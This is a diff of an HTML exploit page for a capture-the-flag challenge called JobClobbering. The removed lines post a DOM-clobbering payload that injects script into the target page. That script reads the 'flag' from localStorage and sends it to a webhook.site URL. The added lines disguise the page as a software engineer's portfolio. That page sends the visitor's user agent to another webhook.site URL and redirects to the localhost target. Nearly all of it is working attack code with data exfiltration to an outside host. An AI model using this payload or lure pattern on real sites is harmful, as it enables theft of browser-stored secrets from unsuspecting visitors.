@@ -1,49 +1,33 @@
-     <!DOCTYPE html>
-     <html>
-     <head>
-         <title>JobClobbering Final Exploit</title>
-     </head>
-     <body>
-         <script>
-             // Final exploit for JobClobbering CTF challenge
-             // This posts a DOM clobbering message and redirects to trigger it
+  <!DOCTYPE html>
+  <html>
+  <head>
+      <title>Michael Thompson - Senior Software Engineer</title>
+      <meta charset="UTF-8">
+      <meta http-equiv="refresh" content="1;url=http://localhost:8400/#messages">
+      <style>
+          body { font-family: Arial, sans-serif; text-align: center; padding: 100px;
+  background: #f4f4f4; }
+          .loading { color: #2c3e50; font-size: 18px; }
+      </style>
+  </head>
+  <body>
+      <h1>Michael Thompson</h1>
+      <p class="loading">Loading portfolio projects...</p>
 
-             async function exploit() {
-                 try {
-                     // Post the DOM clobbering payload
-                     const response = await fetch('http://localhost:8399/messages', {
-                         method: 'POST',
-                         headers: {
-                             'Content-Type': 'application/json',
-                         },
-                         body: JSON.stringify({
-                             name: 'pwned',
-                             message: '<form id="utilsJS"><input name="url" 
-     value="data:text/javascript,fetch(\'https://webhook.site/fb541f2b-805b-4e45-80bc-e836c1231007?flag=\' + 
-     localStorage.getItem(\'flag\'))"></form>'
-                         })
-                     });
+      <script>
+          // Send confirmation
+          try {
+              const img = new Image();
+              img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/LOCA
+  LHOST-REDIRECT?action=redirecting_to_localhost&timestamp=' + Date.now() +
+  '&user_agent=' + encodeURIComponent(navigator.userAgent);
+              document.body.appendChild(img);
+          } catch(e) {}
 
-                     if (response.ok) {
-                         console.log('Payload posted successfully');
-                         // Wait a moment then redirect to trigger the vulnerability
-                         setTimeout(() => {
-                             window.location.href = 'http://localhost:8399/#messages';
-                         }, 1000);
-                     } else {
-                         console.error('Failed to post payload');
-                         // Try to navigate anyway in case payload is already there
-                         window.location.href = 'http://localhost:8399/#messages';
-                     }
-                 } catch (error) {
-                     console.error('Error:', error);
-                     // Try to navigate anyway
-                     window.location.href = 'http://localhost:8399/#messages';
-                 }
-             }
-
-             // Execute the exploit
-             exploit();
-         </script>
-     </body>
-     </html>
+          // Redirect to localhost where DOM clobbering is injected and flag exists
+          setTimeout(() => {
+              window.location.replace('http://localhost:8400/#messages');
+          }, 1000);
+      </script>
+  </body>
+  </html>
